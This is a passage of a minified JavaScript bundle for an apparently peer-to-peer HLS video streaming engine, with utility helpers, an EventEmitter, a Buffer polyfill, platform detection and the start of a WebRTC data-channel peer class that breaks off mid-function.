! function(e, t) { "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define([], t) : "object" == typeof exports ? exports.Hls = t() : e.Hls = t() }("undefined" != typeof self ? self : this, function() { return function(e) {
        function t(i) { if (r[i]) return r[i].exports; var n = r[i] = { i: i, l: !1, exports: {} }; return e[i].call(n.exports, n, n.exports, t), n.l = !0, n.exports } var r = {}; return t.m = e, t.c = r, t.d = function(e, r, i) { t.o(e, r) || Object.defineProperty(e, r, { configurable: !1, enumerable: !0, get: i }) }, t.n = function(e) { var r = e && e.__esModule ? function() { return e.default } : function() { return e }; return t.d(r, "a", r), r }, t.o = function(e, t) { return Object.prototype.hasOwnProperty.call(e, t) }, t.p = "", t(t.s = 21) }([function(e, t, r) { "use strict";

        function i() { return !0 }

        function n(e) { var t = new RegExp("(^|&)" + e + "=([^&]*)(&|$)"),
                r = window.location.search.substr(1).match(t); return null != r && "" !== r[2] ? r[2].toString() : "" }

        function a(e, t, r) { var i = new RegExp("([?&])" + t + "=.*?(&|$)", "i"),
                n = -1 !== e.indexOf("?") ? "&" : "?"; return e.match(i) ? e.replace(i, "$1" + t + "=" + r + "$2") : e + n + t + "=" + r }

        function s() { return Date.parse(new Date) / 1e3 }

        function o(e, t) { return parseInt(Math.random() * (t - e + 1) + e, 10) }

        function l(e) { return 0 === e ? g : .33 * e + .67 }

        function u(e) { var t = new XMLHttpRequest; return new Promise(function(r, i) { t.open("GET", e, !0), t.responseType = "arraybuffer", t.timeout = 3e3, t.onload = function(e) { 206 === t.status ? r() : i() }, t.onerror = function(e) { i() }, t.ontimeout = function(e) { i() }, t.setRequestHeader("Range", "bytes=0-0"), t.send() }) }

        function c() { var e = navigator.language || navigator.userLanguage; return e = e.substr(0, 2), "zh" === e ? "cn" : "en" }

        function d(e) { e.then(function() {}) }

        function f(e) { return new Promise(function(t) { return setTimeout(t, e) }) }

        function h() { if ("undefined" == typeof window) return null; var e = { RTCPeerConnection: window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection, RTCSessionDescription: window.RTCSessionDescription || window.mozRTCSessionDescription || window.webkitRTCSessionDescription, RTCIceCandidate: window.RTCIceCandidate || window.mozRTCIceCandidate || window.webkitRTCIceCandidate }; return e.RTCPeerConnection ? e : null }
        Object.defineProperty(t, "__esModule", { value: !0 }), t.noop = i, t.getQueryParam = n, t.updateQueryStringParam = a, t.getCurrentTs = s, t.randomNum = o, t.calCheckPeersDelay = l, t.performRangeRequest = u, t.navLang = c, t.dontWaitFor = d, t.timeout = f, t.getBrowserRTC = h; var g = 3 }, function(e, t, r) { "use strict";

        function i(e) { console && console.warn && console.warn(e) }

        function n() { n.init.call(this) }

        function a(e) { if ("function" != typeof e) throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof e) }

        function s(e) { return void 0 === e._maxListeners ? n.defaultMaxListeners : e._maxListeners }

        function o(e, t, r, n) { var o, l, u; if (a(r), l = e._events, void 0 === l ? (l = e._events = Object.create(null), e._eventsCount = 0) : (void 0 !== l.newListener && (e.emit("newListener", t, r.listener ? r.listener : r), l = e._events), u = l[t]), void 0 === u) u = l[t] = r, ++e._eventsCount;
            else if ("function" == typeof u ? u = l[t] = n ? [r, u] : [u, r] : n ? u.unshift(r) : u.push(r), (o = s(e)) > 0 && u.length > o && !u.warned) { u.warned = !0; var c = new Error("Possible EventEmitter memory leak detected. " + u.length + " " + String(t) + " listeners added. Use emitter.setMaxListeners() to increase limit");
                c.name = "MaxListenersExceededWarning", c.emitter = e, c.type = t, c.count = u.length, i(c) } return e }

        function l() { if (!this.fired) return this.target.removeListener(this.type, this.wrapFn), this.fired = !0, 0 === arguments.length ? this.listener.call(this.target) : this.listener.apply(this.target, arguments) }

        function u(e, t, r) { var i = { fired: !1, wrapFn: void 0, target: e, type: t, listener: r },
                n = l.bind(i); return n.listener = r, i.wrapFn = n, n }

        function c(e, t, r) { var i = e._events; if (void 0 === i) return []; var n = i[t]; return void 0 === n ? [] : "function" == typeof n ? r ? [n.listener || n] : [n] : r ? g(n) : f(n, n.length) }

        function d(e) { var t = this._events; if (void 0 !== t) { var r = t[e]; if ("function" == typeof r) return 1; if (void 0 !== r) return r.length } return 0 }

        function f(e, t) { for (var r = new Array(t), i = 0; i < t; ++i) r[i] = e[i]; return r }

        function h(e, t) { for (; t + 1 < e.length; t++) e[t] = e[t + 1];
            e.pop() }

        function g(e) { for (var t = new Array(e.length), r = 0; r < t.length; ++r) t[r] = e[r].listener || e[r]; return t }

        function p(e, t) { return new Promise(function(r, i) {
                function n() { void 0 !== a && e.removeListener("error", a), r([].slice.call(arguments)) } var a; "error" !== t && (a = function(r) { e.removeListener(t, n), i(r) }, e.once("error", a)), e.once(t, n) }) } var v, m = "object" == typeof Reflect ? Reflect : null,
            y = m && "function" == typeof m.apply ? m.apply : function(e, t, r) { return Function.prototype.apply.call(e, t, r) };
        v = m && "function" == typeof m.ownKeys ? m.ownKeys : Object.getOwnPropertySymbols ? function(e) { return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e)) } : function(e) { return Object.getOwnPropertyNames(e) }; var b = Number.isNaN || function(e) { return e !== e };
        e.exports = n, e.exports.once = p, n.EventEmitter = n, n.prototype._events = void 0, n.prototype._eventsCount = 0, n.prototype._maxListeners = void 0; var _ = 10;
        Object.defineProperty(n, "defaultMaxListeners", { enumerable: !0, get: function() { return _ }, set: function(e) { if ("number" != typeof e || e < 0 || b(e)) throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + e + ".");
                _ = e } }), n.init = function() { void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null), this._eventsCount = 0), this._maxListeners = this._maxListeners || void 0 }, n.prototype.setMaxListeners = function(e) { if ("number" != typeof e || e < 0 || b(e)) throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + e + "."); return this._maxListeners = e, this }, n.prototype.getMaxListeners = function() { return s(this) }, n.prototype.emit = function(e) { for (var t = [], r = 1; r < arguments.length; r++) t.push(arguments[r]); var i = "error" === e,
                n = this._events; if (void 0 !== n) i = i && void 0 === n.error;
            else if (!i) return !1; if (i) { var a; if (t.length > 0 && (a = t[0]), a instanceof Error) throw a; var s = new Error("Unhandled error." + (a ? " (" + a.message + ")" : "")); throw s.context = a, s } var o = n[e]; if (void 0 === o) return !1; if ("function" == typeof o) y(o, this, t);
            else
                for (var l = o.length, u = f(o, l), r = 0; r < l; ++r) y(u[r], this, t); return !0 }, n.prototype.addListener = function(e, t) { return o(this, e, t, !1) }, n.prototype.on = n.prototype.addListener, n.prototype.prependListener = function(e, t) { return o(this, e, t, !0) }, n.prototype.once = function(e, t) { return a(t), this.on(e, u(this, e, t)), this }, n.prototype.prependOnceListener = function(e, t) { return a(t), this.prependListener(e, u(this, e, t)), this }, n.prototype.removeListener = function(e, t) { var r, i, n, s, o; if (a(t), void 0 === (i = this._events)) return this; if (void 0 === (r = i[e])) return this; if (r === t || r.listener === t) 0 == --this._eventsCount ? this._events = Object.create(null) : (delete i[e], i.removeListener && this.emit("removeListener", e, r.listener || t));
            else if ("function" != typeof r) { for (n = -1, s = r.length - 1; s >= 0; s--)
                    if (r[s] === t || r[s].listener === t) { o = r[s].listener, n = s; break }
                if (n < 0) return this;
                0 === n ? r.shift() : h(r, n), 1 === r.length && (i[e] = r[0]), void 0 !== i.removeListener && this.emit("removeListener", e, o || t) } return this }, n.prototype.off = n.prototype.removeListener, n.prototype.removeAllListeners = function(e) { var t, r, i; if (void 0 === (r = this._events)) return this; if (void 0 === r.removeListener) return 0 === arguments.length ? (this._events = Object.create(null), this._eventsCount = 0) : void 0 !== r[e] && (0 == --this._eventsCount ? this._events = Object.create(null) : delete r[e]), this; if (0 === arguments.length) { var n, a = Object.keys(r); for (i = 0; i < a.length; ++i) "removeListener" !== (n = a[i]) && this.removeAllListeners(n); return this.removeAllListeners("removeListener"), this._events = Object.create(null), this._eventsCount = 0, this } if ("function" == typeof(t = r[e])) this.removeListener(e, t);
            else if (void 0 !== t)
                for (i = t.length - 1; i >= 0; i--) this.removeListener(e, t[i]); return this }, n.prototype.listeners = function(e) { return c(this, e, !0) }, n.prototype.rawListeners = function(e) { return c(this, e, !1) }, n.listenerCount = function(e, t) { return "function" == typeof e.listenerCount ? e.listenerCount(t) : d.call(e, t) }, n.prototype.listenerCount = d, n.prototype.eventNames = function() { return this._eventsCount > 0 ? v(this._events) : [] } }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }
        Object.defineProperty(t, "__esModule", { value: !0 }), t.EngineBase = t.utils = t.WebsocketClient = t.SegmentManager = t.Segment = t.PeerManager = t.BtScheduler = t.config = t.Tracker = t.getPeersThrottle = t.Buffer = t.Server = t.Events = t.Peer = void 0; var n = r(10),
            a = i(n),
            s = r(3),
            o = i(s),
            l = r(25),
            u = i(l),
            c = r(11),
            d = i(c),
            f = r(28),
            h = i(f),
            g = r(30),
            p = i(g),
            v = r(31),
            m = i(v),
            y = r(18),
            b = i(y),
            _ = r(14),
            E = i(_),
            S = r(33),
            T = i(S),
            w = r(16),
            A = i(w),
            R = r(4),
            P = i(R),
            k = r(34),
            D = i(k),
            L = r(7).Buffer;
        t.Peer = a.default, t.Events = o.default, t.Server = u.default, t.Buffer = L, t.getPeersThrottle = d.default, t.Tracker = h.default, t.config = p.default, t.BtScheduler = m.default, t.PeerManager = b.default, t.Segment = E.default, t.SegmentManager = T.default, t.WebsocketClient = A.default, t.utils = P.default, t.EngineBase = D.default }, function(e, t, r) { "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }), t.default = { DC_SIGNAL: "SIGNAL", DC_OPEN: "OPEN", DC_REQUEST: "REQUEST", DC_PIECE_NOT_FOUND: "PIECE_NOT_FOUND", DC_PIECE_ABORT: "PIECE_ABORT", DC_CLOSE: "CLOSE", DC_RESPONSE: "RESPONSE", DC_ERROR: "ERROR", DC_PIECE: "PIECE", DC_TIMEOUT: "TIMEOUT", DC_PIECE_ACK: "PIECE_ACK", DC_METADATA: "METADATA", DC_PLAT_ANDROID: "ANDROID", DC_PLAT_IOS: "IOS", DC_PLAT_WEB: "WEB", DC_CHOKE: "CHOKE", DC_UNCHOKE: "UNCHOKE", DC_HAVE: "HAVE", DC_LOST: "LOST", DC_GET_PEERS: "GET_PEERS", DC_PEERS: "PEERS", DC_STATS: "STATS", DC_SUBSCRIBE: "SUBSCRIBE", DC_UNSUBSCRIBE: "UNSUBSCRIBE", DC_SUBSCRIBE_ACCEPT: "SUBSCRIBE_ACCEPT", DC_SUBSCRIBE_REJECT: "SUBSCRIBE_REJECT", DC_SUBSCRIBE_LEVEL: "SUBSCRIBE_LEVEL", DC_PEER_SIGNAL: "PEER_SIGNAL", DC_PLAYLIST: "PLAY_LIST", BM_LOST: "lost", BM_ADDED_SEG_: "BM_ADDED_SEG_", BM_ADDED_SN_: "BM_ADDED_SN_", BM_SEG_ADDED: "BM_SEG_ADDED", FRAG_CHANGED: "FRAG_CHANGED", FRAG_LOADED: "FRAG_LOADED", FRAG_LOADING: "FRAG_LOADING", RESTART_P2P: "RESTART_P2P", EXCEPTION: "exception" }, e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }
        Object.defineProperty(t, "__esModule", { value: !0 }), t.tools = t.queueMicrotask = t.platform = t.Logger = t.getPeersThrottle = t.errCode = t.Buffer = void 0; var n = r(7),
            a = i(n),
            s = r(17),
            o = i(s),
            l = r(11),
            u = i(l),
            c = r(19),
            d = i(c),
            f = r(8),
            h = i(f),
            g = r(13),
            p = i(g),
            v = r(0),
            m = i(v);
        t.Buffer = a.default, t.errCode = o.default, t.getPeersThrottle = u.default, t.Logger = d.default, t.platform = h.default, t.queueMicrotask = p.default, t.tools = m.default }, function(e, t, r) { "use strict";

        function i(e, t) { var r = o.default.parseURL(e),
                i = r.path.substring(r.path.lastIndexOf(".") + 1); return -1 !== t.indexOf(i) }

        function n() { var e = performance.now(); return { trequest: e, tfirst: 0, tload: 0, aborted: !1, loaded: 0, retry: 0, total: 0, chunkCount: 0, bwEstimate: 0, loading: { start: e, first: 0, end: 0 }, parsing: { start: 0, end: 0 }, buffering: { start: 0, first: 0, end: 0 } } }

        function a(e, t) { var r = void 0,
                i = void 0,
                n = void 0,
                a = void 0,
                s = void 0,
                o = performance.now();
            r = o - 300, i = o - 200, n = o, e.trequest = r, e.tfirst = i, e.tload = n, e.loading = { first: r, start: i, end: n }, a = s = t, e.loaded = a, e.total = s }
        Object.defineProperty(t, "__esModule", { value: !0 }), t.isBlockType = i, t.createLoadStats = n, t.updateLoadStats = a; var s = r(6),
            o = function(e) { return e && e.__esModule ? e : { default: e } }(s) }, function(e, t, r) {! function(t) { var r = /^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/,
                i = /^([^\/?#]*)(.*)$/,
                n = /(?:\/|^)\.(?=\/)/g,
                a = /(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g,
                s = { buildAbsoluteURL: function(e, t, r) { if (r = r || {}, e = e.trim(), !(t = t.trim())) { if (!r.alwaysNormalize) return e; var n = s.parseURL(e); if (!n) throw new Error("Error trying to parse base URL."); return n.path = s.normalizePath(n.path), s.buildURLFromParts(n) } var a = s.parseURL(t); if (!a) throw new Error("Error trying to parse relative URL."); if (a.scheme) return r.alwaysNormalize ? (a.path = s.normalizePath(a.path), s.buildURLFromParts(a)) : t; var o = s.parseURL(e); if (!o) throw new Error("Error trying to parse base URL."); if (!o.netLoc && o.path && "/" !== o.path[0]) { var l = i.exec(o.path);
                            o.netLoc = l[1], o.path = l[2] }
                        o.netLoc && !o.path && (o.path = "/"); var u = { scheme: o.scheme, netLoc: a.netLoc, path: null, params: a.params, query: a.query, fragment: a.fragment }; if (!a.netLoc && (u.netLoc = o.netLoc, "/" !== a.path[0]))
                            if (a.path) { var c = o.path,
                                    d = c.substring(0, c.lastIndexOf("/") + 1) + a.path;
                                u.path = s.normalizePath(d) } else u.path = o.path, a.params || (u.params = o.params, a.query || (u.query = o.query));
                        return null === u.path && (u.path = r.alwaysNormalize ? s.normalizePath(a.path) : a.path), s.buildURLFromParts(u) }, parseURL: function(e) { var t = r.exec(e); return t ? { scheme: t[1] || "", netLoc: t[2] || "", path: t[3] || "", params: t[4] || "", query: t[5] || "", fragment: t[6] || "" } : null }, normalizePath: function(e) { for (e = e.split("").reverse().join("").replace(n, ""); e.length !== (e = e.replace(a, "")).length;); return e.split("").reverse().join("") }, buildURLFromParts: function(e) { return e.scheme + e.netLoc + e.path + e.params + e.query + e.fragment } };
            e.exports = s }() }, function(e, t, r) { "use strict";

        function i(e) { if (e > b) throw new RangeError('The value "' + e + '" is invalid for option "size"'); var t = new Uint8Array(e); return t.__proto__ = n.prototype, t }

        function n(e, t, r) { if ("number" == typeof e) { if ("string" == typeof t) throw new TypeError('The "string" argument must be of type string. Received type number'); return l(e) } return a(e, t, r) }

        function a(e, t, r) { if ("string" == typeof e) return u(e, t); if (ArrayBuffer.isView(e)) return c(e); if (null == e) throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + (void 0 === e ? "undefined" : y(e))); if (v(e, ArrayBuffer) || e && v(e.buffer, ArrayBuffer)) return d(e, t, r); if ("number" == typeof e) throw new TypeError('The "value" argument must not be of type number. Received type number'); var i = e.valueOf && e.valueOf(); if (null != i && i !== e) return n.from(i, t, r); var a = f(e); if (a) return a; if ("undefined" != typeof Symbol && null != Symbol.toPrimitive && "function" == typeof e[Symbol.toPrimitive]) return n.from(e[Symbol.toPrimitive]("string"), t, r); throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + (void 0 === e ? "undefined" : y(e))) }

        function s(e) { if ("number" != typeof e) throw new TypeError('"size" argument must be of type number'); if (e < 0) throw new RangeError('The value "' + e + '" is invalid for option "size"') }

        function o(e, t, r) { return s(e), e <= 0 ? i(e) : void 0 !== t ? "string" == typeof r ? i(e).fill(t, r) : i(e).fill(t) : i(e) }

        function l(e) { return s(e), i(e < 0 ? 0 : 0 | h(e)) }

        function u(e, t) { if ("string" == typeof t && "" !== t || (t = "utf8"), !n.isEncoding(t)) throw new TypeError("Unknown encoding: " + t); var r = 0 | g(e, t),
                a = i(r),
                s = a.write(e, t); return s !== r && (a = a.slice(0, s)), a }

        function c(e) { for (var t = e.length < 0 ? 0 : 0 | h(e.length), r = i(t), n = 0; n < t; n += 1) r[n] = 255 & e[n]; return r }

        function d(e, t, r) { if (t < 0 || e.byteLength < t) throw new RangeError('"offset" is outside of buffer bounds'); if (e.byteLength < t + (r || 0)) throw new RangeError('"length" is outside of buffer bounds'); var i; return i = void 0 === t && void 0 === r ? new Uint8Array(e) : void 0 === r ? new Uint8Array(e, t) : new Uint8Array(e, t, r), i.__proto__ = n.prototype, i }

        function f(e) { if (n.isBuffer(e)) { var t = 0 | h(e.length),
                    r = i(t); return 0 === r.length ? r : (e.copy(r, 0, 0, t), r) } return void 0 !== e.length ? "number" != typeof e.length || m(e.length) ? i(0) : c(e) : "Buffer" === e.type && Array.isArray(e.data) ? c(e.data) : void 0 }

        function h(e) { if (e >= b) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + b.toString(16) + " bytes"); return 0 | e }

        function g(e, t) { if (n.isBuffer(e)) return e.length; if (ArrayBuffer.isView(e) || v(e, ArrayBuffer)) return e.byteLength; if ("string" != typeof e) throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + (void 0 === e ? "undefined" : y(e))); var r = e.length,
                i = arguments.length > 2 && !0 === arguments[2]; if (!i && 0 === r) return 0; for (var a = !1;;) switch (t) {
                case "ascii":
                case "latin1":
                case "binary":
                    return r;
                case "utf8":
                case "utf-8":
                    return p(e).length;
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return 2 * r;
                case "hex":
                    return r >>> 1;
                default:
                    if (a) return i ? -1 : p(e).length;
                    t = ("" + t).toLowerCase(), a = !0 } }

        function p(e, t) { t = t || 1 / 0; for (var r, i = e.length, n = null, a = [], s = 0; s < i; ++s) { if ((r = e.charCodeAt(s)) > 55295 && r < 57344) { if (!n) { if (r > 56319) {
                            (t -= 3) > -1 && a.push(239, 191, 189); continue } if (s + 1 === i) {
                            (t -= 3) > -1 && a.push(239, 191, 189); continue }
                        n = r; continue } if (r < 56320) {
                        (t -= 3) > -1 && a.push(239, 191, 189), n = r; continue }
                    r = 65536 + (n - 55296 << 10 | r - 56320) } else n && (t -= 3) > -1 && a.push(239, 191, 189); if (n = null, r < 128) { if ((t -= 1) < 0) break;
                    a.push(r) } else if (r < 2048) { if ((t -= 2) < 0) break;
                    a.push(r >> 6 | 192, 63 & r | 128) } else if (r < 65536) { if ((t -= 3) < 0) break;
                    a.push(r >> 12 | 224, r >> 6 & 63 | 128, 63 & r | 128) } else { if (!(r < 1114112)) throw new Error("Invalid code point"); if ((t -= 4) < 0) break;
                    a.push(r >> 18 | 240, r >> 12 & 63 | 128, r >> 6 & 63 | 128, 63 & r | 128) } } return a }

        function v(e, t) { return e instanceof t || null != e && null != e.constructor && null != e.constructor.name && e.constructor.name === t.name }

        function m(e) { return e !== e } var y = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) { return typeof e } : function(e) { return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e };
        t.Buffer = n; var b = 2147483647;
        t.kMaxLength = b, n.TYPED_ARRAY_SUPPORT = function() { try { var e = new Uint8Array(1); return e.__proto__ = { __proto__: Uint8Array.prototype, foo: function() { return 42 } }, 42 === e.foo() } catch (e) { return !1 } }(), n.TYPED_ARRAY_SUPPORT || "undefined" == typeof console || "function" != typeof console.error || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."), "undefined" != typeof Symbol && null != Symbol.species && n[Symbol.species] === n && Object.defineProperty(n, Symbol.species, { value: null, configurable: !0, enumerable: !1, writable: !1 }), n.from = function(e, t, r) { return a(e, t, r) }, n.prototype.__proto__ = Uint8Array.prototype, n.__proto__ = Uint8Array, n.alloc = function(e, t, r) { return o(e, t, r) }, n.allocUnsafe = function(e) { return l(e) }, n.isBuffer = function(e) { return null != e && !0 === e._isBuffer && e !== n.prototype }, n.isEncoding = function(e) { switch (String(e).toLowerCase()) {
                case "hex":
                case "utf8":
                case "utf-8":
                case "ascii":
                case "latin1":
                case "binary":
                case "base64":
                case "ucs2":
                case "ucs-2":
                case "utf16le":
                case "utf-16le":
                    return !0;
                default:
                    return !1 } }, n.concat = function(e, t) { if (!Array.isArray(e)) throw new TypeError('"list" argument must be an Array of Buffers'); if (0 === e.length) return n.alloc(0); var r; if (void 0 === t)
                for (t = 0, r = 0; r < e.length; ++r) t += e[r].length; var i = n.allocUnsafe(t),
                a = 0; for (r = 0; r < e.length; ++r) { var s = e[r]; if (v(s, Uint8Array) && (s = n.from(s)), !n.isBuffer(s)) throw new TypeError('"list" argument must be an Array of Buffers');
                s.copy(i, a), a += s.length } return i }, n.byteLength = g, n.prototype._isBuffer = !0, n.prototype.copy = function(e, t, r, i) { if (!n.isBuffer(e)) throw new TypeError("argument should be a Buffer"); if (r || (r = 0), i || 0 === i || (i = this.length), t >= e.length && (t = e.length), t || (t = 0), i > 0 && i < r && (i = r), i === r) return 0; if (0 === e.length || 0 === this.length) return 0; if (t < 0) throw new RangeError("targetStart out of bounds"); if (r < 0 || r >= this.length) throw new RangeError("Index out of range"); if (i < 0) throw new RangeError("sourceEnd out of bounds");
            i > this.length && (i = this.length), e.length - t < i - r && (i = e.length - t + r); var a = i - r; if (this === e && "function" == typeof Uint8Array.prototype.copyWithin) this.copyWithin(t, r, i);
            else if (this === e && r < t && t < i)
                for (var s = a - 1; s >= 0; --s) e[s + t] = this[s + r];
            else Uint8Array.prototype.set.call(e, this.subarray(r, i), t); return a } }, function(e, t, r) { "use strict";

        function i() { return navigator.userAgent.toLowerCase() }

        function n(e) { return "" + (new RegExp(e + "(\\d+((\\.|_)\\d+)*)").exec(i()) || [, 0])[1] || void 0 }

        function a(e) { return parseFloat((e || "").replace(/\_/g, ".")) || 0 } var s = { ANDROID_WEB: "android-web", IOS_WEB: "iOS-web", PC_NATIVE: "PC-native", PC_WEB: "PC-web" },
            o = { getNetType: function() { var e = (new RegExp("nettype\\/(\\w*)").exec(i()) || [, ""])[1].toLowerCase(); if (!e && navigator.connection) { switch (navigator.connection.type) {
                            case "ethernet":
                                e = "ethernet"; break;
                            case "cellular":
                                e = "cellular"; break;
                            default:
                                e = "wifi" } } return e }, getPlatform: function() { return o.isAndroid() ? s.ANDROID_WEB : o.isIOS() ? s.IOS_WEB : o.isElectron() ? s.PC_NATIVE : s.PC_WEB }, isX5: function() { return this.isAndroid() && /\s(TBS|X5Core)\/[\w\.\-]+/i.test(i()) }, isPC: function() { return !a(n("os ")) && !a(n("android[/ ]")) }, isIOS: function() { return a(n("os ")) }, isAndroid: function() { return a(n("android[/ ]")) }, isIOSSafari: function() { return this.isIOS() && this.isSafari() }, isElectron: function() { return /electron/i.test(i()) }, isMobile: function() { return o.isAndroid() || o.isIOS() }, isSafari: function() { return /^((?!chrome|android).)*safari/i.test(i()) }, isFirefox: function() { return /firefox/i.test(i()) }, isChrome: function() { return /chrome/i.test(i()) }, device: s, getBrowser: function() { return o.isX5() ? "X5" : o.isChrome() ? "Chrome" : o.isFirefox() ? "Firefox" : o.isIOSSafari() ? "iOS-Safari" : o.isSafari() ? "Mac-Safari" : "Unknown" } };
        e.exports = o }, function(e, t, r) { "use strict";
        Object.defineProperty(t, "__esModule", { value: !0 }); var i = Object.assign || function(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]) } return e },
            n = r(2);
        t.default = i({ SCH_DCHAVE: "SCH_DCHAVE" }, n.Events), e.exports = t.default }, function(e, t, r) { "use strict";

        function i(e) { return e && e.__esModule ? e : { default: e } }

        function n(e, t) { if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function") }

        function a(e, t) { if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !t || "object" != typeof t && "function" != typeof t ? e : t }

        function s(e, t) { if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, { constructor: { value: e, enumerable: !1, writable: !0, configurable: !0 } }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t) }

        function o(e, t, r, i) { var n = []; if (i) { for (var a = void 0, s = 0; s < r - 1; s++) a = e.slice(s * t, (s + 1) * t), n.push(a);
                a = e.slice(e.byteLength - i, e.byteLength), n.push(a) } else
                for (var o = void 0, l = 0; l < r; l++) o = e.slice(l * t, (l + 1) * t), n.push(o); return n }
        Object.defineProperty(t, "__esModule", { value: !0 }); var l = Object.assign || function(e) { for (var t = 1; t < arguments.length; t++) { var r = arguments[t]; for (var i in r) Object.prototype.hasOwnProperty.call(r, i) && (e[i] = r[i]) } return e },
            u = function() {
                function e(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } } return function(t, r, i) { return r && e(t.prototype, r), i && e(t, i), t } }(),
            c = r(24),
            d = i(c),
            f = r(1),
            h = i(f),
            g = r(3),
            p = i(g),
            v = r(0),
            m = r(14),
            y = i(m),
            b = r(8),
            _ = i(b),
            E = r(7).Buffer,
            S = 64e3,
            T = function(e) {
                function t(e, r, i, s, o, u) { var c = arguments.length > 6 && void 0 !== arguments[6] ? arguments[6] : {};
                    n(this, t); var f = a(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    f.engine = e, f.channel = e.fetcher.channelId, f.logger = e.logger, f.config = o, f.isInitiator = s, f.options = c, f.typeExpected = u, f.remotePeerId = i, f.intermediator = c.intermediator || null, f.channelId = s ? r + "-" + i : i + "-" + r, f.platform = "unknown", f.mobile = !1, f.mobileWeb = !1, f.connected = !1, f.msgQueue = [], f.miss = 0, f.bufArr = [], f.packetSize = S, f.connTimeout = setTimeout(function() { f.logger.warn("dc " + f.channelId + " connection timeout"), f.emit(p.default.DC_ERROR, !0) }, 3e4), f.sendReqQueue = [], f.downloading = !1, f.uploading = !1, f.choked = !1, f.downloadListeners = [], f.pieceMsg = {}, f.timeSendRequest = 0, f.timeReceivePiece = 0, f.timeSendPiece = 0, f.weight = 0, f.peersConnected = 1, f.timeJoin = (0, v.getCurrentTs)(), f.continuousHits = 0, f.uploadSpeed = 0, f.gotPeers = !1; var h = {}; if (f.options.stuns.length > 0) { var g = [];
                        f.options.stuns.forEach(function(e) { f.logger.info("use stun " + e), g.push(e) }), h.iceServers = [{ urls: g }] } return f.config.webRTCConfig && (h = l({}, h, f.config.webRTCConfig)), f.playlistMap = new Map, f._datachannel = new d.default({ initiator: s, channelName: f.channelId, trickle: c.trickle || !1, config: h }), f._init(f._datachannel), f.dataExchangeTs = f.timeJoin, f.startSN = Number.MAX_SAFE_INTEGER, f.endSN = -1, f.liveEdgeSN = 0, f.subscribeEdgeSN = 0, f } return s(t, e), u(t, null, [{ key: "VERSION", get: function() { return "5" } }]), u(t, [{ key: "addDownloadListener", value: function(e) { this.downloadListeners.push({ handler: e }) } }, { key: "_init", value: function(e) { var t = this;
                        e.on("error", function(e) { t.emit(p.default.DC_ERROR, !0) }), e.on("signal", function(e) { t.emit(p.default.DC_SIGNAL, e) }); var r = function() { for (t.logger.info("datachannel CONNECTED to " + t.remotePeerId + " from " + (t.intermediator ? "peer" : "server")), t.connected = !0, clearTimeout(t.connTimeout), t.emit(p.default.DC_OPEN); t.msgQueue.length > 0;) { var e = t.msgQueue.shift();
                                t.emit(e.event, e) } };
                        e.once("connect", r), e.on("data", function(e) { var r = t.logger; if ("string" == typeof e) { var i = JSON.parse(e); if (!t.connected) return void t.msgQueue.push(i); var n = i.event; switch (n !== p.default.DC_PLAYLIST && n !== p.default.DC_PEER_SIGNAL && r.debug("datachannel receive string: " + e + " from " + t.remotePeerId), n) {
                                    case p.default.DC_HAVE:
                                        if (t.emit(i.event, i), !i.sn) return;
                                        t.config.live ? t.liveEdgeSN = i.sn : (i.sn < t.startSN && (t.startSN = i.sn), i.sn > t.endSN && (t.endSN = i.sn)); break;
                                    case p.default.DC_PIECE:
                                        t.downloading = !0, t.dataExchangeTs = (0, v.getCurrentTs)(), t.timeReceivePiece = performance.now(), t.pieceMsg = i, t._prepareForBinary(i.attachments, i.seg_id, i.sn, i.size), t.emit(i.event, i); break;
                                    case p.default.DC_PIECE_NOT_FOUND:
                                        t._sendNextReq() || (t.downloading = !1), t.emit(i.event, i); break;
                                    case p.default.DC_REQUEST:
                                        t._handleRequestMsg(i); break;
                                    case p.default.DC_PIECE_ACK:
                                        t.dataExchangeTs = (0, v.getCurrentTs)(), t._handlePieceAck(i), t.emit(i.event, i); break;
                                    case p.default.DC_STATS:
                                        t._handleStats(i); break;
                                    case p.default.DC_PLAYLIST:
                                        t.config.sharePlaylist && t._handlePlaylist(i); break;
                                    case p.default.DC_METADATA:
                                        t._handleMetadata(i); break;
                                    case p.default.DC_PIECE_ABORT:
                                        if (t.downloading) { if (t.downloadListeners.length > 0) { var a = !0,
                                                    s = !1,
                                                    o = void 0; try { for (var l, u = t.downloadListeners[Symbol.iterator](); !(a = (l = u.next()).done); a = !0) {
